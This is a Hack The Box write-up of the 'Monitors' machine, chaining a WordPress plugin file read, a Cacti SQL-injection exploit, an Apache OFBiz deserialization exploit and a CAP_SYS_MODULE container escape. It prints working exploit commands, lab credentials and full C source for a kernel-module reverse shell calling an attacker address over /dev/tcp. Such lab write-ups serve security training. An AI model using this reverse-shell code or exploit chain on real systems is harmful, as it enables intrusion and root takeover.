+++
date = '2025-03-14T16:25:52-04:00'
draft = false
title = 'HtB Monitors'
tags = ['writeup','hackthebox','hard','linux']
hideToc = false
+++
![HTB-Monitors](/images/Monitors.png)

Monitors is a hard Linux machine that involves `WordPress plugin` exploitation leading to a `command injection` via `SQL injection` through a well known network management web application in order to get a shell on the system. Then by performing basic service file enumeration one can gain the user password and thus a foothold to the system through SSH. The root stage consists of a `Java based XML RPC deserialization` attack against `Apache OFBiz` to gain a shell in a Docker container. Then it is possible by abusing the `CAP_SYS_MODULE` capability to load a malicious kernel module against the host and escalate privileges to root.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ nmap -T4 -p- -A -v 10.129.232.111
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 22:28 EDT
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to Monitor &#8211; Taking hardware monitoring seriously
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.5.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 6.720 days (since Wed Mar  5 04:16:47 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP - 80/tcp

Looks like we've got a WordPress site running on port 80/tcp.

![monitors1](/images/monitors1.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ wpscan --url http://monitors.htb -e ap
[...snip...]
[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
[...snip...]
[+] Upload directory has listing enabled: http://monitors.htb/wp-content/uploads/
[...snip...]
[+] WordPress theme in use: iconic-one
[...snip...]
[i] Plugin(s) Identified:

[+] wp-with-spritz
```

## Initial Access

### Remote File Inclusion

A quick search of the installed plugin `wp-with-spritz` reveals a remote file inclusion vulnerability at the following endpoint:
`plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd`

![monitors2](/images/monitors2.png)

Now we know the one non-root user: `marcus`. Let's keep enumerating to see if we can view any website config files.  I was unable to locate `/var/www/html/wp-config.php` or any other WordPress default files for that matter... perhaps we don't know where they're stored.

Luckily, we can check `/etc/apache2/sites-enabled/000-default.conf`

```Text
# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf
```

Two more strings to pull on: `monitors.htb.conf` and `cacti-admin.monitors.htb.conf`

```Text
ServerAdmin admin@monitors.htb
ServerName monitors.htb
ServerAlias monitors.htb
DocumentRoot /var/www/wordpress
```

```Text
ServerAdmin admin@monitors.htb
ServerName cacti-admin.monitors.htb
DocumentRoot /usr/share/cacti
ServerAlias cacti-admin.monitors.htb
```

At this point, we can add `cacti-admin.monitors.htb` to our `/etc/hosts` file, and we can also take a peek at `/var/www/wordpress/wp-config.php`

```php
[...snip...]
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
[...snip...]
```

### cacti-admin.monitors.htb

![monitors3](/images/monitors3.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ searchsploit cacti 1.2.12
--------------------------------------------- ---------------------------------
 Exploit Title                               |  Path
--------------------------------------------- ---------------------------------
Cacti 1.2.12 - 'filter' SQL Injection        | php/webapps/49810.py
--------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Looks like this exploit won't work unless we have a valid Caci login. Let's try `admin:BestAdministrator@2020!`, our found password from the `wp-config.php`

![monitors4](/images/monitors4.png)

Excellent! Now let's try our exploit script.

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ python 49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.199 --lport 4444
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:9ad0df6e9c26d22cbf74f54a62d1ec61ee2bd691,1741750073
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
"name","hex"
"",""
"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
"guest","43e9a4ab75570f5b"

[+] Check your nc listener!
```

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ nc -nvlp 4444     
listening on [any] 4444 ...
connect to [10.10.14.199] from (UNKNOWN) [10.129.232.111] 41668
/bin/sh: 0: can\'t access tty; job control turned off
$ whoami
www-data
```

### Shell as www-data

```sh
www-data@monitors:/usr/share/cacti/cacti/include$ cat config.php
cat config.php
[...snip...]
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cacti';
$database_password = 'cactipass';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
[...snip...]
```

Didn't see anything interesting in the databases... womp womp. Let's keep searching.

```sh
www-data@monitors:/etc/systemd/system$ cat cacti-backup.service
cat cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
```

Awesome, looks like a custom service! Let's take a look at `/home/marcus/.backup/backup.sh`

```sh
#!/bin/bash

backup_name="cacti_backup"
config_pass="VerticalEdge2020"

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```

This is great... looks like the `config_pass` value is being used to login as... well... let's hope marcus.

```sh
www-data@monitors:/etc/systemd/system$ su marcus
su marcus
Password: VerticalEdge2020

marcus@monitors:/etc/systemd/system$ id
id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
```

Go grab that `user.txt` and let's keep going.

## Privilege Escalation

### Enumeration

Also in marcus' home folder is `note.txt`

```Text
marcus@monitors:~$ cat note.txt
cat note.txt
TODO:

Disable phpinfo in php.ini              - DONE
Update docker image for production use  - 
```

We also find something interesting listening on port 8443.

```sh
marcus@monitors:~$ netstat -ano
netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
[...snip...]
```

### Port Forward - 8443/tcp

Let's do some port forwarding and see if we can access that.

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ gobuster dir -u https://localhost:8443/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k --exclude-length 62
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://localhost:8443/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          62
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> /images/]
/content              (Status: 302) [Size: 0] [--> /content/]
/common               (Status: 302) [Size: 0] [--> /common/]
[...snip...]
```

Visiting `/images` keeps returning an error, however when I visited `/content` I was redirected to the following login page for `Apache OFBiz v17.12.01`:

![monitors5](/images/monitors5.png)

### Apache OFBiz v17.12.01

Oh look, another exploit waiting for us:

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ searchsploit ofbiz 17.12.01
-------------------------------------------------------- -----------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- -----------------------
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)   | java/webapps/50178.sh
-------------------------------------------------------- ------------------------
Shellcodes: No Results
```

Make sure to follow the exploit instructions in the comments, and you might need to revert back to Java 11 to get `ysoserial` to work.

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ bash 50178.sh -i 10.10.14.199 -p 5555

[*] Creating a shell file with bash

[*] Downloading YsoSerial JAR File

[*] Generating a JAR payload

[*] Sending malicious shell to server...

[*] Generating a second JAR payload

[*] Executing the payload in the server...


[*]Deleting Files...
```

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ nc -nvlp 5555  
listening on [any] 5555 ...
connect to [10.10.14.199] from (UNKNOWN) [10.129.232.111] 49820
bash: cannot set terminal process group (32): Inappropriate ioctl for device
bash: no job control in this shell
root@55f9268f69df:/usr/src/apache-ofbiz-17.12.01# whoami
whoami
root
```

### Shell as root (Docker)

Let's check capabilities within the container. It seems we've got `CAP_SYS_MODULE` capabilities, which is vulnerable to sharing kernel modules with the host.

```sh
root@55f9268f69df:~# capsh --print
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```

### CAP_SYS_MODULE Exploitation

Here's a helpful [blog post](https://blog.nody.cc/posts/container-breakouts-part2/) of the container escape we'll be attempting. Made a few minor changes to the reverse shell code, as well as the Makefile.

```sh
root@55f9268f69df:~# ls /usr/src
ls /usr/src
apache-ofbiz-17.12.01
linux-headers-4.15.0-132
linux-headers-4.15.0-132-generic
linux-headers-4.15.0-142
linux-headers-4.15.0-142-generic
linux-headers-4.15.0-151
linux-headers-4.15.0-151-generic
root@55f9268f69df:~# uname -r
uname -r
4.15.0-151-generic
```

Next, upload your `reverse-shell.c` and `Makefile` to the Docker using `wget`.

```C
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.199/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```Makefile
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/4.15.0-142-generic/build M=/root modules
clean:
	make -C /lib/modules/4.15.0-142-generic/build M=/root clean
```

Go ahead and compile your module.

```sh
root@55f9268f69df:~# make
make
make -C /lib/modules/4.15.0-142-generic/build M=/root modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
  CC [M]  /root/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/reverse-shell.mod.o
  LD [M]  /root/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
```

Now setup your listener, and trigger the kernel module / reverse shell.

```sh
root@55f9268f69df:~# insmod reverse-shell.ko
insmod reverse-shell.ko
```

And we've owned the system.

```sh
┌──(pl4stic㉿kali)-[~/htb/monitors]
└─$ nc -nvlp 4444               
listening on [any] 4444 ...
connect to [10.10.14.199] from (UNKNOWN) [10.129.232.111] 35740
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# whoami
whoami
root
```